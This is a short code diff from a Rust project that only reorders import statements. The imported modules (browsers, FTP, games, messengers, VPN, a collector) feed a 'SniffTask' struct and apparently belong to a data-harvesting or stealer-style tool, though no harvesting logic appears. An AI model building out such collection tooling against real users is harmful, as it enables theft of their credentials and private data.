@@ -17,12 +17,12 @@ use alloc::boxed::Box;
 use alloc::vec;
 use browsers::BrowsersTask;
 use collector::Collector;
-use filesystem::path::Path;
 use filesystem::FileSystem;
+use filesystem::path::Path;
 use ftp::FtpTask;
 use games::GamesTask;
 use messengers::MessengersTask;
-use tasks::{composite_task, CompositeTask, Task};
+use tasks::{CompositeTask, Task, composite_task};
 use vpn::VpnTask;
 
 pub struct SniffTask<C: Collector, F: FileSystem> {
